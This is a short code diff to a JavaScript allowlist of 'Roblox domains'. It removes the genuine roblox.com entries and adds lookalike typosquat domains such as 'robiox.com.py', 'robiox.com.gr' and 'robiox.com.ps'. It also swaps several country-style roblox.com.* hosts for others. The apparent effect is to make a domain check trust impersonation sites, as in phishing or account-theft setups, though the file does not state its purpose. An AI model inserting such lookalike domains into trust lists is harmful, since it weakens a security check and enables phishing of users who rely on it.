@@ -3,14 +3,14 @@
 
 // Allowed Roblox domains (add or remove as needed)
 const ALLOWED_DOMAINS = [
-    'roblox.com',
-    'www.roblox.com',
-    'web.roblox.com',
+    'robiox.com.py',
+    'robiox.com.gr',
+    'robiox.com.ps',
     'api.roblox.com',
     'roblox.com.ge',  // Custom domain example
-    'roblox.com.br',  // Add more as needed
-    'roblox.com.tr',
-    'roblox.com.mx',
+    'roblox.com.af',  // Add more as needed
+    'roblox.com.pk',
+    'roblox.com.ni',
     'roblox.com.au'
 ];
 
